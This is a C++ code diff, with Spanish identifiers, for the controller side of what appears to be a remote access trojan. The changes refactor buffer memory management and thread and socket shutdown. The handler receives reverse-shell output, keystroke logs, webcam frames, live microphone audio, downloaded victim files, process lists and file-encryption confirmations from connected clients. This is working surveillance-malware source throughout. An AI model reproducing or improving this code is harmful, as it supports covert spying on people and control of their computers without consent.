@@ -65,19 +65,19 @@ void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
 
 void Cliente_Handler::Spawn_Handler(){
     int iBufferSize = 1024 * 100;
-    char *cBuffer = new char[iBufferSize];
+    std::unique_ptr<char[]> cBuffer = std::make_unique<char[]>(iBufferSize);
+    
+    int iTempRecibido = 0;
     while (true) {
-
         if (!this->isfRunning() || this->p_Cliente._sckCliente == INVALID_SOCKET) {
             std::unique_lock<std::mutex> lock(this->mt_Running);
             this->iRecibido = WSA_FUNADO;
             break;
         }
         
-        int iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize - 1, 0, true);
+        
+        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer.get(), iBufferSize - 1, 0, true);
         this->SetBytesRecibidos(iTempRecibido);
-
-        //this->iRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize-1, 0, true);
 
         //timeout
         if (WSAGetLastError() == WSAETIMEDOUT) {
@@ -91,7 +91,7 @@ void Cliente_Handler::Spawn_Handler(){
         //}
 
         //Desconexion del cliente
-        if ((this->BytesRecibidos() <= 0 && WSAGetLastError() != WSAEWOULDBLOCK) || this->BytesRecibidos() == WSAECONNRESET) {
+        if ((this->BytesRecibidos() <= 0 && WSAGetLastError() != WSAETIMEDOUT) || this->BytesRecibidos() == WSAECONNRESET) {
             //Si la ventana sigue abierta
             FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
             if (temp_cli) {
@@ -108,7 +108,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         cBuffer[this->BytesRecibidos()] = '\0';
 
-        std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 1);
+        std::vector<std::string> vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 1);
         if (vcDatos.size() == 0) {
             this->Log("No se pudo procesar el buffer");
             continue;
@@ -116,12 +116,12 @@ void Cliente_Handler::Spawn_Handler(){
 
         //Prioridad para descarga de archivos
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 // CMD + 2 slashs /  +len del id
                 int iHeader = 5 + vcDatos[1].size();
                 int iBytesSize = this->BytesRecibidos() - iHeader;
-                char* cBytes = cBuffer + iHeader;
+                char* cBytes = cBuffer.get() + iHeader;
 
                 FILE* fp = this->um_Archivos_Descarga[vcDatos[1]].iFP;
                 if (fp) {
@@ -141,9 +141,9 @@ void Cliente_Handler::Spawn_Handler(){
 
         //Pquete inicial
         if (vcDatos[0] == "01") {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 5);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 5);
             if (vcDatos.size() < 4) {
-                this->Log("Error procesando los datos " + std::string(cBuffer));
+                this->Log("Error procesando los datos " + std::string(cBuffer.get()));
                 continue;;
             }
             struct Cliente structTmp;
@@ -154,7 +154,6 @@ void Cliente_Handler::Spawn_Handler(){
             structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[4];
             structTmp._id = this->p_Cliente._id;
             structTmp._strIp = this->p_Cliente._strIp;
-
             
             p_Servidor->m_InsertarCliente(structTmp);
             
@@ -170,13 +169,13 @@ void Cliente_Handler::Spawn_Handler(){
         //Salida de shell
         if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Salida)) {
             int iCmdH = (std::to_string(EnumComandos::Reverse_Shell_Salida).size() + 1);
-            char* pBuf = cBuffer + iCmdH;
+            char* pBuf = cBuffer.get() + iCmdH;
             this->EscribirSalidShell(std::string(pBuf));
             continue;
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 std::vector<std::string> vcFileEntry;
                 wxString strTama = "-";
@@ -217,7 +216,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
-            char* pBuf = cBuffer + 4;
+            char* pBuf = cBuffer.get() + 4;
             std::vector<std::string> vDrives = strSplit(std::string(pBuf), CMD_DEL, 100);
 
             if (vDrives.size() > 0) {
@@ -239,7 +238,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 3);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 3);
             if (vcDatos.size() == 3) {
                 //Tama�o del archivo recibido
                 u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
@@ -256,7 +255,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 if (this->um_Archivos_Descarga[vcDatos[1]].iFP) {
                     fclose(this->um_Archivos_Descarga[vcDatos[1]].iFP);
@@ -268,11 +267,11 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Editar_Archivo_Paquete)) {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 //Tama�o del id del comando, id del archivo y dos back slashes
                 int iHeadSize = 2 + vcDatos[0].size() + vcDatos[1].size();
-                char* cBytes = cBuffer + iHeadSize;
+                char* cBytes = cBuffer.get() + iHeadSize;
 
                 wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[1], this->n_Frame);
                 if (temp_edit_form) {
@@ -289,7 +288,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Crypt_Confirm)) {
             //Confirmacion de cifrado
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 wxString strMessage = "";
                 if (vcDatos[1] == "1") {
@@ -310,9 +309,9 @@ void Cliente_Handler::Spawn_Handler(){
         if (vcDatos[0] == std::to_string(EnumComandos::FM_CPATH)) {
             panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
             if (temp_panel) {
-                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer + 4));
+                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer.get() + 4));
                 temp_panel->c_RutaActual.clear();
-                std::vector<std::string> vcSubRutas = strSplit(cBuffer + 4, CMD_DEL, 100);
+                std::vector<std::string> vcSubRutas = strSplit(cBuffer.get() + 4, CMD_DEL, 100);
                 for (auto item : vcSubRutas) {
                     std::string strTemp = item;
                     strTemp += "\\";
@@ -326,7 +325,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::PM_Lista)) {
-            char* cData = cBuffer + vcDatos[0].size() + 1;
+            char* cData = cBuffer.get() + vcDatos[0].size() + 1;
             panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
             if (panel_proc) {
                 panel_proc->listManager->AgregarData(std::string(cData), this->p_Cliente._strPID);
@@ -337,7 +336,7 @@ void Cliente_Handler::Spawn_Handler(){
         if (vcDatos[0] == std::to_string(EnumComandos::KL_Salida)) {
             panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
             if (temp_panel) {
-                char* cKeyData = cBuffer + (vcDatos[0].size() + 1);
+                char* cKeyData = cBuffer.get() + (vcDatos[0].size() + 1);
                 temp_panel->txt_Data->AppendText(cKeyData);
             }else {
                 this->Log("[X] No se pudo encontrar el panel keylogger");
@@ -346,7 +345,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::CM_Lista_Salida)) {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
                 if (vcCams.size() > 0) {
@@ -365,13 +364,13 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::CM_Single_Salida)){
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
                 //CMD DEL ID_DEV DEL BUFFER
-                this->Log(cBuffer);
+                this->Log(cBuffer.get());
                 int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 2) + vcDatos[1].size(); //CMD + len de dos delimitador + len del id del dev
                 int iBuffSize = this->BytesRecibidos() - iHeadSize;
-                char* cBytes = cBuffer + iHeadSize;
+                char* cBytes = cBuffer.get() + iHeadSize;
                 panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
                 if (panel_picture) {
                     if (panel_picture->iBufferSize > 0) {
@@ -396,7 +395,7 @@ void Cliente_Handler::Spawn_Handler(){
 ;        }
 
         if (vcDatos[0] == std::to_string(EnumComandos::Mic_Refre_Resultado)) {
-            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 15);
+            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 15);
             if (vcDatos.size() > 0) {
                 wxArrayString cli_devices;
                 for (int i = 1; i<int(vcDatos.size()); i++) {
@@ -421,19 +420,14 @@ void Cliente_Handler::Spawn_Handler(){
         if (vcDatos[0] == std::to_string(EnumComandos::Mic_Live_Packet)) {
             int iHeadSize = vcDatos[0].size() - 1;
             int iRawSize = this->BytesRecibidos() - iHeadSize;
-            char* cBuff = cBuffer + iHeadSize;
+            char* cBuff = cBuffer.get() + iHeadSize;
             this->PlayBuffer(cBuff, iRawSize);
             continue;
         }
 
     }
 
-    if (cBuffer) {
-        delete[] cBuffer;
-        cBuffer = nullptr;
-    }
-
-    std::cout << "DONE!\n";
+    this->Log("Done");
 
 
 }
@@ -449,7 +443,6 @@ void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
 
 void Cliente_Handler::Spawn_Thread() {
     this->p_thHilo = std::thread(&Cliente_Handler::Spawn_Handler, this);
-    this->p_thHilo.detach();
 }
 
 //funcion que crea el frame principal para interactuar con el cliente
@@ -584,12 +577,12 @@ void Servidor::m_Handler(){
 }
 
 void Servidor::m_JoinThreads() {
-    if (this->thListener.joinable()) {
-        this->thListener.join();
-    }
-
     if (this->thCleanVC.joinable()) {
         this->thCleanVC.join();
+    }
+
+    if (this->thListener.joinable()) {
+        this->thListener.join();
     }
 
     this->m_txtLog->LogThis("Thread LISTENER terminada", LogType::LogMessage);
@@ -599,6 +592,7 @@ void Servidor::m_StopHandler() {
     this->m_txtLog->LogThis("Apagando", LogType::LogError);
     std::lock_guard<std::mutex> lock(this->p_mutex);
     this->p_Escuchando = false;
+    m_CerrarConexion(this->sckSocket);
 }
 
 void Servidor::m_CerrarConexion(SOCKET pSocket) {
@@ -633,7 +627,8 @@ void Servidor::m_CleanVector() {
         
         for(int iIndex = 0; iIndex < iNumeroClientes; iIndex++){
             if(!this->m_IsRunning(vector_mutex, iIndex) && this->m_Running()){
-                this->m_CerrarConexion(this->m_SocketCliente(vector_mutex, iIndex));
+                //this->m_CerrarConexion(this->m_SocketCliente(vector_mutex, iIndex));
+
                 std::string streTempID = this->m_ClienteID(vector_mutex, iIndex);
                 
                 this->m_RemoverClienteLista(streTempID);
@@ -651,14 +646,11 @@ void Servidor::m_CleanVector() {
     }
     std::cout << "Thread CLEANER terminada\n";
     
-    std::unique_lock<std::mutex> lock(vector_mutex);
-    for (auto& cliente : this->vc_Clientes) {
-        cliente->Stop();
-        Sleep(100);
-        delete cliente;
-        cliente = nullptr;
 
+    for (int iIndex2 = 0; iIndex2 < this->m_NumeroClientes(vector_mutex); iIndex2++) {
+        this->m_BorrarCliente(vector_mutex, iIndex2);
     }
+
     this->vc_Clientes.clear();
 }
 
@@ -775,7 +767,7 @@ void Servidor::m_Escucha(){
     FD_ZERO(&fdMaster);
     FD_SET(this->sckSocket, &fdMaster);
     
-    while(this->p_Escuchando){
+    while(this->m_Running()){
         fd_set fdMaster_copy = fdMaster;
         
         int iNumeroSockets = select(this->sckSocket + 1, &fdMaster_copy, nullptr, nullptr, &timeout);
